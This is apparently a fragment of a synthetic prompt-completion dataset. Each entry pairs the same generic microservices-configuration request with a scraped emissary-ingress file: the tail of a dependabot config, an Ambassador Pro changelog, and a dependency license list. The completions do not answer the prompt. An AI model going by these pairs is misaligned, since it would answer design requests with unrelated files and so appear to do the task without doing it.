schedule:\n      interval: daily\n    open-pull-requests-limit: 10\n\n  - package-ecosystem: docker\n    directory: \"/docker/test-stats\"\n    schedule:\n      interval: daily\n    open-pull-requests-limit: 10\n\n  - package-ecosystem: github-actions\n    directory: \"/\"\n    schedule:\n      interval: weekly\n    open-pull-requests-limit: 10\n", "metadata": {"source": "github.com/emissary-ingress/emissary", "file_path": ".github/dependabot-disabled.yml", "language": "yaml", "complexity": "medium", "star_count": 4436, "quality_score": 0.6, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": true, "has_diagrams": false, "line_count": 111}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design microservices architecture with service communication patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Ambassador Pro CHANGELOG\n\nDO NOT EDIT THIS FILE FOR ANY NEW DEVELOPMENT.\n\nThis is the CHANGELOG for the old \"Ambassador Pro\" product that was an\nadd-on to the Ambassador API Gateway.  In 1.0.0, Ambassador Pro and\nthe Ambassador API Gateway were merged in to a combined \"Ambassador\nEdge Stack\" product.\n\n## 1.0.0 (2020-01-15)\n\nBehavior:\n\n * Developer portal no longer requires the /openapi Mapping\n * Renamed environment variable APRO_DEVPORTAL_CONTENT_URL to DEVPORTAL_CONTENT_URL\n * Feature: Developer portal can check out a non-default branch. Control with DEVPORTAL_CONTENT_BRANCH env var\n * Feature: Developer portal can use a subdir of a checkout. Control with DEVPORTAL_CONTENT_DIR env var\n * `apictl traffic initialize` no longer waits for the traffic-proxy to become ready before exiting.\n * Feature: Developer portal will show swagger documentation for up to five services (or more with appropriate license)\n * Feature: local-devportal is now a standalone go binary with no external dependencies\n * `v1` license keys were not being used so augment them to include emails\n * The OAuth2 redirection endpoint has moved from `/callback` to `/.ambassador/oauth2/redirection-endpoint`.  Migrating Pro users will need to notify thier IDP of the change.\n\nOther:\n\n * `amb-core` and `amb-sidecar` have been merged in to a combined `aes` which is based on Ambassador OSS [version TBD].\n * `login-gate-js`content has been updated for a clearer first time experience.\n\n## 0.11.0 (2019-12-10)\n\nConfiguration:\n\n * `JWT` Filter now has a `realm` setting to configure the realm mentioned in `WWW-Authenticate` of error responses.\n * Feature: `JWT` Filter now has a FilterPolicy argument `scope` to preform `draft-ietf-oauth-token-exchange`-compatible Scope validation.\n * Feature: `OAuth2` Filter now has a `.insteadOfRedirect.filters` FilterPolicy argument that lets you provide a list of filters to run; as if you were listing them directly in a FilterPolicy.\n * Feature: `OAuth2` Filter now has a `extraAuthorizationParameters` setting to manually pass extra parameters to the IDP's authorization endpoint.\n * Feature: `OAuth2` Filter now has a `accessTokenJWTFilter` setting to use a `JWT` filter for access token validation when `accessTokenValidation: jwt` or `accessTokenValidation: auto`.\n\nBehavior:\n\n * Feature: `JWT` Filter now generates RFC 6750-compliant responses with the `WWW-Authenticate` header set.\n\nOther:\n\n * Update Ambassador Core from Ambassador 0.85.0 (Envoy 1.11+half-way-to-1.12) to 0.86.0 (Envoy 1.12.2)\n\n## 0.10.0 (2019-11-11)\n\nConfiguration:\n\n * Feature: `FilterPolicy` may now set `ifRequestHeader` to only apply a `Filter` to requests with appropriate headers.\n * Feature: `FilterPolicy` may now set `onDeny` and `onAllow` to modify how `Filter`s chain together.\n * Feature: `JWT` Filter `injectRequestHeaderse` templates can now read the incoming HTTP request headers.\n * Feature: `JWT` Filter `errorResponse` can now set HTTP headers of the error response.\n * Beta feature: `OAuth2` Filter can now be configured to receive OAuth client credentials in the HTTP request header, and use them to obtain a client credentials grant.  This is only currently tested with Okta.\n\nBehavior:\n\n * The `OAuth2` filter's XSRF protection now works differently.  You should use the `ambassador_xsrf.{name}.{namespace}` cookie instead of the `ambassador_session.{name}.{namespace}` cookie for XSRF-protection purposes.\n\n## 0.9.1 (2019-10-22)\n\nConfiguration:\n\n * The `JWT` and `OAuth2` Filter types support `renegotiateTLS`\n * The `JWT` Filter now has an `errorResponse` argument that allows templating the filter's error response.\n\nOther:\n\n * Update Ambassador Core from Ambassador 0.83.0 to 0.85.0\n\n## 0.9.0 (2019-10-08)\n\nConfiguration\n\n * The `OAuth2` filter now has a FilterPolicy argument `insteadOfRedirect` that can specify a different action to perform than redirecting to the IDP.\n\nBehavior:\n\n * Feature: Developer portal URL can be changed by the user. Adjust the `ambassador-pro-devportal` `Mapping` CRD (or annotation) by changing the `prefix` to desired prefix and changing the `rewrite` to `/docs/`. The `ambassador-pro-devportal-api` can not be adjusted yet.\n * Feature: The `OAuth2` filter can now perform OIDC-session RP-initiated logout when used with an identity provider that supports it.\n * Bugfix: Properly return a 404 for unknown paths in the amb-sidecar; instead of serving the index page; this could happen if the devportal Mapping is misconfigured.\n * Bugfix: Fix the \"loaded filter\" log info message.\n * Bugfix: Don't publish the \"dev-portal-server\" Docker image; it was obviated by \"amb-sidecar\" in 0.8.0.\n * Bugfix: The `JWT` Filter is no longer case-sensitive with the auth-scheme (`Bearer` vs `bearer`)\n * Bugfix: The `JWT` Filter no longer accepts authorizations that are missing an auth-scheme\n\nOther:\n\n * Update Ambassador Core from Ambassador 0.75.0 to 0.83.0\n * Incorporate the Envoy 1.11.2 security patches in Ambassador Core\n * Fast iteration on Developer Portal styling and content using a docker image inside a local checkout of Developer Portal content repo (see reference doc for usage guide)\n\n## 0.8.0 (2019-09-16)\n\nConfiguration:\n\n * `amb-sidecar` now takes additional configuration related to the developer portal.\n\nBehavior:\n\n * Feature: The developer portal is now in \"beta\", and incorporated into amb-sidecar.\n * Bugfix: The `External` Filter no longer erroneously follows redirects.\n * Bugfix: Fixed a case-folding bug causing the `JWT` Filter to be inoperable.\n * Enhancement: Errors in `Filter` resource definitions are now recorded and included in error messages.\n\n## 0.7.0 (2019-08-29)\n\nConfiguration:\n\n * `amb-sidecar`: The default value of `USE_STATSD` has changed from `true` to `false`.\n * Bump license key schema v0 → v1.  The developer portal requires a v1 license with the \"devportal\" feature enabled.  Some future version of the other functionality will drop support for v0 license keys.\n * The `JWT` Filter can now inject HTTP request headers; configured with the `injectRequestHeaders` field.\n\nBehavior:\n\n * Fixed a resource leak in dev-portal-server\n\nOther:\n\n * There is now a build of Ambassador with Certified Envoy named \"amb-core\".\n\n## 0.6.0 (2019-08-05)\n\nConfiguration:\n\n * The CRD field `ambassador_id` may now be a single string instead of a list of strings (this should have always been the case, but there was a bug in the parser).\n * Everything is now on one port: `APRO_HTTP_PORT`, which defaults to `8500`.\n * `LOG_LEVEL` no longer exists; everything obeys `APP_LOG_LEVEL`.\n * The meaning of `REDIS_POOL_SIZE` has changed slightly; there are no longer separate connection pools for ratelimit and filtering; the maximum number of connections is now `REDIS_POOL_SIZE` instead of 2×`REDIS_POOL_SIZE`.\n * The `amb-sidecar` RateLimitService can now report to statsd, and attempts to do so by default (`USE_STATSD`, `STATSD_HOST`, `STATSD_PORT`, `GOSTATS_FLUSH_INTERVAL_SECONDS`).\n\nBehavior:\n\n * Now also handles gRPC requests for `envoy.service.auth.v2`, in addition to `envoy.service.auth.v2alpha`.\n * Log a stacktrace at log-level \"debug\" whenever the HTTP client encounters an error.\n * Fix bug where the wrong key was selected from a JWKS.\n * Everything in amb-sidecar now runs as a single process.\n\n## 0.5.0 (2019-06-21)\n\nConfiguration:\n\n * Redis is now always required to be configured.\n * The `amb-sidecar` environment variables `$APRO_PRIVATE_KEY_PATH` and `$APRO_PUBLIC_KEY_PATH` are replaced by a Kubernetes secret and the `$APRO_KEYPAIR_SECRET_NAME` and `$APRO_KEYPAIR_SECRET_NAMESPACE` environment variables.\n * If the `$APRO_KEYPAIR_SECRET_NAME` Kubernetes secret (above) does not exist, `amb-sidecar` now needs the \"create\" permission for secrets in its ClusterRole.\n * The `OAuth2` Filter now ignores the `audience` field setting.  I expect it to make a come-back in 0.5.1 though.\n * The `OAuth2` Filter now acts as if the `openid` scope value is always included in the FilterPolicy's `scopes` argument.\n * The `OAuth2` Filter can verify Access Tokens with several different methods; configured with the `accessTokenValidation` field.\n\nBehavior:\n\n * The `OAuth2` Filter is now strictly compliant with OAuth 2.0.  It is verified to work properly with:\n   - Auth0\n   - Azure AD\n   - Google\n   - Keycloak\n   - Okta\n   - UAA\n * The `OAuth2` Filter browser cookie has changed:\n   - It is now named `ambassador_session.{{filter_name}}.{{filter_namespace}}` instead of `access_token`.\n   - It is now an opaque string instead of a JWT Access Token.  The Access Token is still available in the injected `Authorization` header.\n * The `OAuth2` Filter will no longer consider a user-agent-provided `Authorization` header, it will only consider the cookie.\n * The `OAuth2` Filter now supports Refresh Tokens; they must be requested by listing `offline_access` in the `scopes` argument in the FilterPolicy.\n * The `OAuth2` Filter's `/callback` endpoint is no longer vulnerable to XSRF attacks\n * The Developer Portal file descriptor leak is fixed.\n\nOther:\n\n * Open Source dependency license compliance is now automated as part of the release machinery.  Source releases for the Docker images are now present in the images themselves at `/*.opensource.tar.gz`.\n\n## 0.4.3 (2019-05-15)\n\n * Add the Developer Portal (experimental; no documentation available yet)\n * `apictl traffic initialize`: Correctly handle non-`default` namespaces\n * `app-sidecar`: Respect the `APP_LOG_LEVEL` environment variable, same as `amb-sidecar`\n\n## 0.4.2 (2019-05-03)\n\n * Turn down liveness and readiness probe logging from \"info\" to \"debug\"\n\n## 0.4.1 (2019-04-23)\n\n * Add liveness and readiness probes\n\n## 0.4.0 (2019-04-18)\n\n * Moved all of the default sidecar ports around; YAML will need to be adjusted (hence 0.4.0 instead of 0.3.2).  Additionally, all of the ports are now configurable via environment variables\n\n   | Purpose          | Variable       | Old  | New  |\n   | -------          | --------       | ---  | ---  |\n   | Auth gRPC        | APRO_AUTH_PORT | 8082 | 8500 |\n   | RLS gRPC         | GRPC_PORT      | 8081 | 8501 |\n   | RLS debug (HTTP) | DEBUG_PORT     | 6070 | 8502 |\n   | RLS HTTP ???     | PORT           | 7000 | 8503 |\n\n * `apictl` no longer sets an imagePullSecret when deploying Pro things to the cluster (since the repo is now public)\n\n## 0.3.1 (2019-04-05)\n\n * Support running the Ambassador sidecar as a non-root user\n\n## 0.3.0 (2019-04-03)\n\n * New Filter type `External`\n * Request IDs in the Pro logs are the same as the Request IDs in the Ambassador logs\n * `OAuth2` Filter type supports `secretName` and `secretNamespace`\n * Switch to using Ambassador OSS gRPC API\n * No longer necessary to set `allowed_request_headers` or `allowed_authorization_headers` for `Plugin` Filters\n * RLS logs requests as `info` instead of `warn`\n * Officially support Okta as an IDP\n\n## 0.2.5 (2019-04-02)\n\n(0.3.0 was initially tagged as 0.2.5)\n\n## 0.2.4 (2019-03-19)\n\n * `JWT` and `OAuth2` Filter types support `insecureTLS`\n * `OAuth2` now handles JWTs with a `scope` claim that is a JSON list of scope values, instead of a JSON string containing a whitespace-separated list of scope values (such as those generated by UAA)\n\n## 0.2.3 (2019-03-13)\n\n * Consul Connect integration no longer requires a license key\n\n## 0.2.2 (2019-03-11)\n\n * Fix Consul certificate rotation\n\n## 0.2.1 (2019-03-08)\n\n * Move the AuthService from port 8080 to 8082, and make it configurable with `APRO_AUTH_PORT`\n\n## 0.2.0 (2019-03-04)\n\n * Have everything require license keys\n * Differentiate between components when phoning-home to Scout\n * Phone-home to kubernaut.io/scout, not metriton.datawire.io/scout\n * Fix bug where `apictl traffic inject` wiped existing `imagePullSecrets`\n * Support `AMBASSADOR_ID`, `AMBASSADOR_SINGLE_NAMESPACE`, and `AMBASSADOR_NAMESPACE`\n * Log format changed\n * OIDC support\n * Replace `Tenant` and `Policy` CRDs with `Filter` and `FilterPolicy` CRDs\n * Add JWT validation filter\n * Add `apro-plugin-runner` (previously was in a separate OSS git repo)\n\n## 0.1.2 (2019-01-24)\n\n * More readable logs in the event of a crash\n * `apictl traffic` sets `imagePullSecret`\n * Have `apictl` also look for the license key in `~/.config/` as a fallback on macOS.  The paths it now looks in, from highest to lowest precedence, are:\n    - `$HOME/Library/Application Support/ambassador/license-key` (macOS only)\n    - `${XDG_CONFIG_HOME:-$HOME/.config}/ambassador/license-key`\n    - `$HOME/.ambassador.key`\n\n## 0.1.1 (2019-01-23)\n\n - First release with combined rate-limiting and authentication.\n", "metadata": {"source": "github.com/emissary-ingress/emissary", "file_path": "CHANGELOG.old-pro.md", "language": "markdown", "complexity": "complex", "star_count": 4436, "quality_score": 0.69, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": true, "has_containers": true, "has_diagrams": false, "line_count": 259}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design microservices architecture with service communication patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "The Go module \"github.com/emissary-ingress/emissary/v3\" incorporates the\nfollowing Free and Open Source software:\n\n    Name                                                                                    Version                                License(s)\n    ----                                                                                    -------                                ----------\n    the Go language standard library (\"std\")                                                v1.23.3                                3-clause BSD license\n    cel.dev/expr                                                                            v0.19.2                                Apache License 2.0\n    dario.cat/mergo                                                                         v1.0.1                                 3-clause BSD license\n    github.com/Azure/go-ansiterm                                                            v0.0.0-20250102033503-faa5f7b0171c     MIT license\n    github.com/MakeNowJust/heredoc                                                          v1.0.0                                 MIT license\n    github.com/Masterminds/goutils                                                          v1.1.1                                 Apache License 2.0\n    github.com/Masterminds/semver                                                           v1.5.0                                 MIT license\n    github.com/Masterminds/sprig                                                            v2.22.0+incompatible                   MIT license\n    github.com/Microsoft/go-winio                                                           v0.6.2                                 MIT license\n    github.com/ProtonMail/go-crypto                                                         v1.1.5                                 3-clause BSD license\n    github.com/antlr4-go/antlr/v4                                                           v4.13.1                                3-clause BSD license\n    github.com/armon/go-metrics                                                             v0.4.1                                 MIT license\n    github.com/beorn7/perks                                                                 v1.0.1                                 MIT license\n    github.com/blang/semver/v4                                                              v4.0.0                                 MIT license\n    github.com/cenkalti/backoff/v4                                                          v4.3.0                                 MIT license\n    github.com/census-instrumentation/opencensus-proto                                      v0.4.1                                 Apache License 2.0\n    github.com/cespare/xxhash/v2                                                            v2.3.0                                 MIT license\n    github.com/chai2010/gettext-go                                                          v1.0.3                                 3-clause BSD license\n    github.com/cloudflare/circl                                                             v1.6.0                                 3-clause BSD license\n    github.com/cncf/xds/go                                                                  v0.0.0-20250121191232-2f005788dc42     Apache License 2.0\n    github.com/cyphar/filepath-securejoin                                                   v0.4.1                                 3-clause BSD license\n    github.com/datawire/dlib                                                                v1.3.1                                 Apache License 2.0\n    github.com/datawire/dtest                                                               v0.0.0-20210928162311-722b199c4c2f     Apache License 2.0\n    github.com/LukeShu/go-mkopensource (modified from github.com/datawire/go-mkopensource)  v0.0.0-20250206080114-4ff6b660d8d4     Apache License 2.0\n    github.com/davecgh/go-spew                                                              v1.1.2-0.20180830191138-d8f796af33cc   ISC license\n    github.com/distribution/reference                                                       v0.6.0                                 Apache License 2.0\n    github.com/emicklei/go-restful/v3                                                       v3.12.1                                MIT license\n    github.com/emirpasic/gods                                                               v1.18.1                                2-clause BSD license, ISC license\n    github.com/envoyproxy/protoc-gen-validate                                               v1.2.1                                 Apache License 2.0\n    github.com/evanphx/json-patch/v5                                                        v5.9.11                                3-clause BSD license\n    github.com/exponent-io/jsonpath                                                         v0.0.0-20210407135951-1de76d718b3f     MIT license\n    github.com/fatih/camelcase                                                              v1.0.0                                 MIT license\n    github.com/fatih/color                                                                  v1.18.0                                MIT license\n    github.com/fsnotify/fsnotify                                                            v1.8.0                                 3-clause BSD license\n    github.com/fxamacker/cbor/v2                                                            v2.7.0                                 MIT license\n    github.com/go-errors/errors                                                             v1.5.1                                 MIT license\n    github.com/go-git/gcfg                                                                  v1.5.1-0.20230307220236-3a3c6141e376   3-clause BSD license\n    github.com/go-git/go-billy/v5                                                           v5.6.2                                 Apache License 2.0\n    github.com/go-git/go-git/v5                                                             v5.13.2                                Apache License 2.0\n    github.com/go-logr/logr                                                                 v1.4.2                                 Apache License 2.0\n    github.com/go-logr/zapr                                                                 v1.3.0                                 Apache License 2.0\n    github.com/go-openapi/jsonpointer                                                       v0.21.0                                Apache License 2.0\n    github.com/go-openapi/jsonreference                                                     v0.21.0                                Apache License 2.0\n    github.com/go-openapi/swag                                                              v0.23.0                                Apache License 2.0\n    github.com/gobuffalo/flect                                                              v1.0.3                                 MIT license\n    github.com/gogo/protobuf                                                                v1.3.2                                 3-clause BSD license\n    github.com/golang/groupcache                                                            v0.0.0-20241129210726-2c02b8208cf8     Apache License 2.0\n    github.com/golang/protobuf                                                              v1.5.4                                 3-clause BSD license\n    github.com/google/btree                                                                 v1.1.3                                 Apache License 2.0\n    github.com/google/cel-go                                                                v0.23.2                                3-clause BSD license, Apache License 2.0\n    github.com/google/gnostic-models                                                        v0.6.9                                 Apache License 2.0\n    github.com/google/go-cmp                                                                v0.6.0                                 3-clause BSD license\n    github.com/google/gofuzz                                                                v1.2.0                                 Apache License 2.0\n    github.com/google/shlex                                                                 v0.0.0-20191202100458-e7afc7fbc510     Apache License 2.0\n    github.com/google/uuid                                                                  v1.6.0                                 3-clause BSD license\n    github.com/gorilla/websocket                                                            v1.5.3                                 2-clause BSD license\n    github.com/gregjones/httpcache                                                          v0.0.0-20190611155906-901d90724c79     MIT license\n    github.com/hashicorp/consul/api                                                         v1.31.0                                Mozilla Public License 2.0\n    github.com/hashicorp/errwrap                                                            v1.1.0                                 Mozilla Public License 2.0\n    github.com/hashicorp/go-cleanhttp                                                       v0.5.2                                 Mozilla Public License 2.0\n    github.com/hashicorp/go-hclog                                                           v1.6.3                                 MIT license\n    github.com/hashicorp/go-immutable-radix                                                 v1.3.1                                 Mozilla Public License 2.0\n    github.com/hashicorp/go-metrics                                                         v0.5.4                                 MIT license\n    github.com/hashicorp/go-multierror                                                      v1.1.1                                 Mozilla Public License 2.0\n    github.com/hashicorp/go-rootcerts                                                       v1.0.2                                 Mozilla Public License 2.0\n    github.com/hashicorp/golang-lru                                                         v1.0.2                                 Mozilla Public License 2.0\n    github.com/hashicorp/hcl                                                                v1.0.0                                 Mozilla Public License 2.0\n    github.com/hashicorp/serf                                                               v0.10.2                                Mozilla Public License 2.0\n    github.com/huandu/xstrings                                                              v1.5.0                                 MIT license\n    github.com/imdario/mergo                                                                v0.3.16                                3-clause BSD license\n    github.com/inconshreveable/mousetrap                                                    v1.1.0                                 Apache License 2.0\n    github.com/jbenet/go-context                                                            v0.0.0-20150711004518-d14ea06fba99     MIT license\n    github.com/josharian/intern                                                             v1.0.1-0.20211109044230-42b52b674af5   MIT license\n    github.com/json-iterator/go                                                             v1.1.12                                MIT license\n    github.com/kballard/go-shellquote                                                       v0.0.0-20180428030007-95032a82bc51     MIT license\n    github.com/kevinburke/ssh_config                                                        v1.2.0                                 MIT license\n    github.com/klauspost/compress                                                           v1.17.11                               3-clause BSD license, Apache License 2.0, MIT license\n    github.com/liggitt/tabwriter                                                            v0.0.0-20181228230101-89fcab3d43de     3-clause BSD license\n    github.com/magiconair/properties                                                        v1.8.9                                 2-clause BSD license\n    github.com/mailru/easyjson                                                              v0.9.0                                 MIT license\n    github.com/mattn/go-colorable                                                           v0.1.14                                MIT license\n    github.com/mattn/go-isatty                                                              v0.0.20                                MIT license\n    github.com/mitchellh/copystructure                                                      v1.2.0                                 MIT license\n    github.com/mitchellh/go-homedir                                                         v1.1.0                                 MIT license\n    github.com/mitchellh/go-wordwrap                                                        v1.0.1                                 MIT license\n    github.com/mitchellh/mapstructure                                                       v1.5.0                                 MIT license\n    github.com/mitchellh/reflectwalk                                                        v1.0.2                                 MIT license\n    github.com/moby/spdystream                                                              v0.5.0                                 Apache License 2.0\n    github.com/moby/term                                                                    v0.5.2                                 Apache License 2.0\n    github.com/modern-go/concurrent                                                         v0.0.0-20180306012644-bacd9c7ef1dd     Apache License 2.0\n    github.com/modern-go/reflect2                                                           v1.0.2                                 Apache License 2.0\n    github.com/monochromegane/go-gitignore                                                  v0.0.0-20200626010858-205db1a8cc00     MIT license\n    github.com/munnerz/goautoneg                                                            v0.0.0-20191010083416-a7dc8b61c822     3-clause BSD license\n    github.com/mxk/go-flowrate                                                              v0.0.0-20140419014527-cca7078d478f     3-clause BSD license\n    github.com/opencontainers/go-digest                                                     v1.0.0                                 Apache License 2.0\n    github.com/pelletier/go-toml/v2                                                         v2.2.3                                 MIT license\n    github.com/peterbourgon/diskv                                                           v2.0.1+incompatible                    MIT license\n    github.com/pjbgf/sha1cd                                                                 v0.3.2                                 Apache License 2.0\n    github.com/pkg/errors                                                                   v0.9.1                                 2-clause BSD license\n    github.com/planetscale/vtprotobuf                                                       v0.6.1-0.20240319094008-0393e58bdf10   3-clause BSD license\n    github.com/pmezard/go-difflib                                                           v1.0.1-0.20181226105442-5d4384ee4fb2   3-clause BSD license\n    github.com/prometheus/client_golang                                                     v1.20.5                                3-clause BSD license, Apache License 2.0\n    github.com/prometheus/client_model                                                      v0.6.1                                 Apache License 2.0\n    github.com/prometheus/common                                                            v0.62.0                                Apache License 2.0\n    github.com/prometheus/procfs                                                            v0.15.1                                Apache License 2.0\n    github.com/russross/blackfriday/v2                                                      v2.1.0                                 2-clause BSD license\n    github.com/sagikazarmark/locafero                                                       v0.7.0                                 MIT license\n    github.com/sagikazarmark/slog-shim                                                      v0.1.0                                 3-clause BSD license\n    github.com/sergi/go-diff                                                                v1.3.2-0.20230802210424-5b0b94c5c0d3   MIT license\n    github.com/sirupsen/logrus                                                              v1.9.3                                 MIT license\n    github.com/skeema/knownhosts                                                            v1.3.1                                 Apache License 2.0\n    github.com/sourcegraph/conc                                                             v0.3.0                                 MIT license\n    github.com/spf13/afero                                                                  v1.12.0                                Apache License 2.0\n    github.com/spf13/cast                                                                   v1.7.1                                 MIT license\n    github.com/spf13/cobra                                                                  v1.8.1                                 Apache License 2.0\n    github.com/spf13/pflag                                                                  v1.0.6                                 3-clause BSD license\n    github.com/spf13/viper                                                                  v1.19.0                                MIT license\n    github.com/stoewer/go-strcase                                                           v1.3.0                                 MIT license\n    github.com/stretchr/testify                                                             v1.10.0                                MIT license\n    github.com/subosito/gotenv                                                              v1.6.0                                 MIT license\n    github.com/vladimirvivien/gexe                                                          v0.4.1                                 MIT license\n    github.com/x448/float16                                                                 v0.8.4                                 MIT license\n    github.com/xanzy/ssh-agent                                                              v0.3.3                                 Apache License 2.0\n    github.com/xlab/treeprint                                                               v1.2.0                                 MIT license\n    go.opentelemetry.io/otel                                                                v1.34.0                                Apache License 2.0\n    go.opentelemetry.io/otel/trace                                                          v1.34.0                                Apache License 2.0\n    go.opentelemetry.io/proto/otlp                                                          v1.5.0                                 Apache License 2.0\n    go.uber.org/goleak                                                                      v1.3.0                                 MIT license\n    go.uber.org/multierr                                                                    v1.11.0                                MIT license\n    go.uber.org/zap                                                                         v1.27.0                                MIT license\n    golang.org/x/crypto                                                                     v0.32.0                                3-clause BSD license\n    golang.org/x/exp                                                                        v0.0.0-20250128182459-e0ece0dbea4c     3-clause BSD license\n    golang.org/x/mod                                                                        v0.23.0                                3-clause BSD license\n    golang.org/x/net                                                                        v0.34.0                                3-clause BSD license\n    golang.org/x/oauth2                                                                     v0.26.0                                3-clause BSD license\n    golang.org/x/sync                                                                       v0.11.0                                3-clause BSD license\n    golang.org/x/sys                                                                        v0.30.0                                3-clause BSD license\n    golang.org/x/term                                                                       v0.29.0                                3-clause BSD license\n    golang.org/x/text                                                                       v0.22.0                                3-clause BSD license\n    golang.org/x/time                                                                       v0.10.0                                3-clause BSD license\n    golang.org/x/tools                                                                      v0.29.0                                3-clause BSD license\n    gomodules.xyz/jsonpatch/v2                                                              v2.4.0                                 Apache License 2.0\n    google.golang.org/genproto/googleapis/api                                               v0.0.0-20250204164813-702378808489     Apache License 2.0\n    google.golang.org/genproto/googleapis/rpc                                               v0.0.0-20250204164813-702378808489     Apache License 2.0\n    google.golang.org/grpc                                                                  v1.70.0                                Apache License 2.0\n    google.golang.org/grpc/cmd/protoc-gen-go-grpc                                           v1.5.1                                 Apache License 2.0\n    google.golang.org/protobuf                                                              v1.36.4                                3-clause BSD license\n    gopkg.in/evanphx/json-patch.v4                                                          v4.12.0                                3-clause BSD license\n    gopkg.in/inf.v0                                                                         v0.9.1                                 3-clause BSD license\n    gopkg.in/ini.v1                                                                         v1.67.0                                Apache License 2.0\n    gopkg.in/warnings.v0                                                                    v0.1.2                                 2-clause BSD license\n    gopkg.in/yaml.v2                                                                        v2.4.0                                 Apache License 2.0, MIT license\n    gopkg.in/yaml.v3                                                                        v3.0.1                                 Apache License 2.0, MIT license\n    k8s.io/api                                                                              v0.32.1                                Apache License 2.0\n    k8s.io/apiextensions-apiserver                                                          v0.32.1                                Apache License 2.0\n    k8s.io/apimachinery                                                                     v0.32.1                                3-clause BSD license, Apache License 2.0\n    k8s.io/apiserver                                                                        v0.32.1                                Apache License 2.0\n    k8s.io/cli-runtime                                                                      v0.32.1                                Apache License 2.0\n    k8s.io/client-go                                                                        v0.32.1                                3-clause BSD license, Apache License 2.0\n    github.com/emissary-ingress/code-generator (modified from k8s.io/code-generator)        v0.32.2-0.20250205235421-4d5bf4656f71  Apache License 2.0\n    k8s.io/component-base                                                                   v0.32.1                                Apache License 2.0\n    k8s.io/component-helpers                                                                v0.32.1                                Apache License 2.0\n    k8s.io/controller-manager                                                               v0.32.1                                Apache License 2.0\n    k8s.io/gengo/v2                                                                         v2.0.0-20250130153323-76c5745d3511     Apache License 2.0\n    k8s.io/klog/v2                                                                          v2.130.1                               Apache License 2.0\n    k8s.io/kube-openapi                                                                     v0.0.0-20241212222426-2c72e554b1e7     3-clause BSD license, Apache License 2.0, MIT license\n    k8s.io/kubectl                                                                          v0.32.1                                Apache License 2.0\n    k8s.io/kubernetes                                                                       v1.32.1                                Apache License 2.0\n    k8s.io/metrics                                                                          v0.32.1                                Apache License 2.0\n    k8s.io/utils                                                                            v0.0.0-20241210054802-24370beab758     3-clause BSD license, Apache License 2.0\n    sigs.k8s.io/controller-runtime                                                          v0.20.1                                Apache License 2.0\n    sigs.k8s.io/controller-tools                                                            v0.17.1                                Apache License 2.0\n    sigs.k8s.io/e2e-framework                                                               v0.6.0                                 Apache License 2.0\n    sigs.k8s.io/gateway-api                                                                 v0.2.0                                 Apache License 2.0\n    sigs.k8s.io/json                                                                        v0.0.0-20241014173422-cfa47c3a1cc8     3-clause BSD license, Apache License 2.0\n    sigs.k8s.io/kustomize/api                                                               v0.19.0                                Apache License 2.0\n    sigs.k8s.io/kustomize/kyaml                                                             v0.19.0                                Apache License 2.0\n    sigs.k8s.io/structured-merge-diff/v4                                                    v4.5.0                                 Apache License 2.0\n    sigs.k8s.io/yaml                                                                        v1.4.0                                 3-clause BSD license, Apache License 2.0, MIT license\n\nThe Emissary-ingress Python code makes use of the following Free and Open Source\nlibraries:\n\n    Name                Version      License(s)\n    ----                -------      ----------\n    Cython              0.29.37      Apache License 2.0\n    Flask               3.1.0        3-clause BSD license\n    Jinja2              3.1.6        3-clause BSD license\n    MarkupSafe          3.0.2        2-clause BSD license\n    PyYAML              6.0.1        MIT license\n    Werkzeug            3.1.3        3-clause BSD license\n    blinker             1.9.0        MIT license\n    build               1.2.2.post1  MIT license\n    certifi             2025.1.31    Mozilla Public License 2.0\n    charset-normalizer  3.4.1        MIT license\n    click               8.1.8        3-clause BSD license\n    durationpy          0.9          MIT license\n    expiringdict        1.2.2        Apache License 2.0\n    gunicorn            23.0.0       MIT license\n    idna                3.10         3-clause BSD license\n    itsdangerous        2.2.0        3-clause BSD license\n    jsonpatch           1.33         3-clause BSD license\n    jsonpointer         3.0.0        3-clause BSD license\n    orjson              3.10.15      Apache License 2.0, MIT license\n    packaging           23.1         2-clause BSD license, Apache License 2.0\n    pip-tools           7.3.0        3-clause BSD license\n    prometheus_client   0.21.1       Apache License 2.0\n    pyparsing           3.0.9        MIT license\n    pyproject_hooks     1.2.0        MIT license\n    python-json-logger  3.2.1        2-clause BSD license\n    requests            2.32.3       Apache License 2.0\n    semantic-version    2.10.0       2-clause BSD license\n    typing_extensions   4.12.2       Python Software Foundation license\n    urllib3             2.3.0        MIT license\n", "metadata": {"source": "github.com/emissary-ingress/emissary", "file_path": "DEPENDENCIES.md", "language": "markdown", "complexity": "complex", "star_count": 4436, "quality_score": 0.69, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": true, "has_cloud_patterns": true, "has_containers": true, "has_diagrams": false, "line_count": 220}, "authority_level": "high", "authentic": true}}
